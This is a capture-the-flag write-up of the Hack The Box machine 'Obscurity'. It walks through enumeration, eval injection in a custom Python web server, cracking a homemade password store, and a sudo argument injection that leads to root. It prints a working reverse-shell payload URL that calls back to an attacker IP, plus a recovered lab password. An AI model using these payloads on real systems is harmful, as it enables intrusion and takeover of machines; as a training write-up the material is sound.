---
title: "Obscurity - HTB Writeup"
header: 
  teaser: /assets/images/2022-04-14-Obscurity-HTB-Writeup/Obscurity-HTB-Image.png
  header: /assets/images/2022-04-14-Obscurity-HTB-Writeup/Obscurity-HTB-Image.png
  og_image: /assets/images/2022-04-14-Obscurity-HTB-Writeup/Obscurity-HTB-Image.png
excerpt: "The /devlop/SuperSecureServer.py endpoint has a Python file for the custom web server. This is supposed to be the web server that is running on port 8080 so if we can find a vulnerability in this we can use it on the live server."
tags: [htb, writeup, obscurity]
---
## Obscurity - Methodologies

### Information Gathering

#### Nmap Port Scan

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_102212.png)

#### Nmap Script Scan

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_102232.png)

#### Nmap Full Port Scan

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_102252.png)

#### Nmap Vulnerability Scan

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_102405.png)

### Service Enumeration

#### Nmap HTTP Enumeration

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_102318.png)

#### Nikto Web Scan on Port 8080

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_102427.png)

#### FFuF Web Enumeration on Port 8080

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_102452.png)

#### Web Service Enumeration on Port 8080

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_102631.png)

#### Secret Development Directory - Source Code Leak

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_121858.png)

The /devlop/SuperSecureServer.py endpoint has a Python file for the custom web server. This is supposed to be the web server that is running on port 8080 so if we can find a vulnerability in this we can use it on the live server.

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_121945.png)

### Penetration

#### serveDoc Injection Remote Code Execution

Since the source code is available we can identify possible vulnerabilities in the written code. The custom web server has an unprotected eval function that is used for logging. Whenever a request is made to the server the path is sent through the eval function. A simple proof of concept is shown below on how to inject OS-level commands into this unprotected eval function and achieve remote code execution on the target server.

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_122636.png)

`http://10.10.10.168:8080/';os.system('ping -c 1 10.10.14.2');'`

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_124627.png)

#### User Shell as www-data

By using the link below we are injecting a Python reverse shell one-liner into the unprotected eval function and this is being executed as code on the remote system. Successful exploitation is shown below in the form of a user shell as www-data on the target host.

`http://10.10.10.168:8080/%27;import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.2%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22);'`

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_125236.png)

### Privilege Escalation

#### www-data User Shell Enumeration

Further enumeration of the www-data shell shows that there is more custom-written code in the /home/robert directory. The Robert user appears to be storing their passwords in a custom Python-based encryption system. The source code for this encryption program is world readable allowing us to exfiltrate the program and perform offline enumeration to develop proper exploitation.

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_175651.png)

#### Password Manager - Enumeration

The source code for SuperSecureCrypt.py is shown below. The decrypt functionality is already built into the Python script. The keys for decryption are also world-readable so a malicious Python script is to decrypt the password.

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_175825.png)

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_175809.png)

#### Password Manager - Exploitation

The script to decrypt the passwords is written below. This can be uploaded to the target server with a SimpleHTTP Python module from the attacking server. After copying over the keys and cipher text to the /tmp directory we can run the decrypt functionality stolen out of the initial script. Doing so reveals the credentials below.

`robert:SecThruObsFTW`

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_180611.png)

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_180707.png)

#### Robert User Shell Enumeration

We can su to the Robert user and provide their password for authentication. Enumeration of the user's sudo privileges shows that they can run `BetterSSH.py` as root, which is another custom program in their home folder

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_184729.png)

#### BetterSSH.py Enumeration

Enumeration of BetterSSH.py shows that it is a basic SSH emulator to be used on the local machine. Since we have access to the source code we can find vulnerabilities in the way that it accepts user input. It appears that user input is being taken in and simply appended after a sudo command. Since the -u operator in sudo can be overwritten that means that our input allows us to specify the user that we would like to run under. The program is being run with the sudo binary with no password authentication to run as root, which means the root user is a valid option to specify.

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_184931.png)

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_185000.png)

#### BetterSSH.py Exploitation

Successful exploitation of this unsanitized input is shown below, by prepending `-u root` to commands we can run basic commands as the root user. Reading out root.txt shows that a successful file read as root has been achieved.

![Screenshot](/assets/images/2022-04-14-Obscurity-HTB-Writeup/Screenshot_20220412_185339.png)
